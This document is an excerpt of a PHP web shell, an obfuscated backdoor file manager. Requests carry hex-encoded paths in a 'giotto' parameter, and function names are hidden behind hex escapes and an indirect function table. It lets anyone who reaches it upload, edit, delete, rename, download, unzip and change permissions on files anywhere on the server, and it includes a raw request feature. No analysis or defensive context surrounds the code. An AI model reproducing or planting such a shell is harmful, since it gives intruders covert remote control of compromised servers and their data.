		...
		<body>
			...
			<article>
				<div class="i">
					...
					<?php
					if(isset($_GET["giotto"])) {
						$d = uhex($_GET["giotto"]);
						$GNJ[2](uhex($_GET["giotto"]));
					}
					else {
						$d = $GNJ[3]();
					}
					...
					foreach ($k as $m => $l) { 
						if($l=='' && $m==0) {
							echo '<a class="ajx" href="?giotto=2f">/</a>';
						}
						if($l == '') { 
							continue;
						}
						echo '<a class="ajx" href="?giotto=';
						for ($i = 0; $i <= $m; $i++) {
							echo hex($k[$i]); 
							if($i != $m) {
								echo '2f';
				...
				<div class="u">
					...
					$g = $o_[0].'ER!'.$o_[1];
					if(isset($_FILES["n"])) {
						$z = "\x62\x61\x73\x65\x6e\x61\x6d\x65"($_FILES["n"]["name"]);
                        $owo = $_FILES["n"]["tmp_name"];
							if("\x6d\x6f\x76\x65\x5f\x75\x70\x6c\x6f\x61\x64\x65\x64\x5f\x66\x69\x6c\x65"($owo, $d . "/" . $z)) {
								echo $f;
							}
							else {
								echo $g;
					...
					if(isset($_GET["s"])) {
						echo $a_.uhex($_GET["s"]).$b_.'
									...
									<br />
									<br />
									<input onclick="location.href=\'?giotto='.$_GET["giotto"].'&e='.$_GET["s"].'\'" type="submit" class="w" value="&nbsp;EDIT&nbsp;" />
								'.$c_;
					}
					elseif(isset($_GET["y"])) {
						echo $a_.'REQUEST'.$b_.'
					...
					if(isset($_POST["e"])) {
						if($_POST["b64"] == "1") {
							$ex = "\x73\x74\x72\x69\x70\x73\x6c\x61\x73\x68\x65\x73"(${"\x5f\x50\x4f\x53\x54"}["e"]);
						}
						else {
							$ex = "\x73\x74\x72\x69\x70\x73\x6c\x61\x73\x68\x65\x73"(${"\x5f\x50\x4f\x53\x54"}["e"]);
						}
					...
					elseif(isset($_GET["z"])) {
						...
						$res = $zip->open(uhex($_GET["z"]));
							if($res === TRUE) {
								$zip->extractTo(uhex($_GET["giotto"]));
								$zip->close();
								OK();
							} else {
								ER();
					...
					echo '<table cellspacing="0" cellpadding="7" width="100%">
						...
						<tbody>
							<tr>
								<td>
									<a class="ajx" href="?giotto='.hex($d).'&n">+FILE</a>
									<a class="ajx" href="?giotto='.hex($d).'&l">+DIR</a>
								</td>
							</tr>
						';
							...
							foreach($w as $c){
								...
								if(!$GNJ[30]($c, ".zip")) {
									...
									$zi = '<a href="?giotto='.hex($e).'&z='.hex($c).'">U</a>';
								}
								if($GNJ[31]("$d/$c")) {
										$o = "";
								}
							...
							<td>
								...
								<a class="ajx" href="?giotto='.hex($e).hex("/".$c).'">'.$c.'</a>
							</td>
							<td class="x">
								dir
							</td>
							<td class="x">
								<a class="ajx'.$o.'" href="?giotto='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?giotto='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
							</td>
							<td class="x">
								<a class="ajx" href="?giotto='.hex($e).'&r='.hex($c).'">R</a>
								<a href="?giotto='.hex($e).'&x='.hex($c).'">D</a>
							</td>
						</tr>
						...
						'
							...
							<td>
								...
								<a class="ajx" href="?giotto='.hex($e).'&s='.hex($c).'">'.$c.'</a>
							</td>
							<td class="x">
								'.$s.'
							</td>
							...
							<td class="x">
								<a class="ajx" href="?giotto='.hex($e).'&r='.hex($c).'">R</a>
								<a class="ajx" href="?giotto='.hex($e).'&e='.hex($c).'">E</a>
								<a href="?giotto='.hex($e).'&g='.hex($c).'">G</a>
								'.$zi.'
								<a href="?giotto='.hex($e).'&x='.hex($c).'">D</a>
							</td>
						</tr>
						...
						<tfoot>
							<tr>
								<th class="et">
									<a class="ajx" href="?giotto='.hex($e).'&y">REQUEST</a>
									<a href="?giotto='.hex($e).'&q">EXIT</a>
								</th>
...
<?php
	...
	function OK() {
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?giotto=".hex($d)."&1");
		exit();
	}
	function ER() {
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?giotto=".hex($d)."&0");
		exit();
	}
	function x($c) {
		global $GNJ;
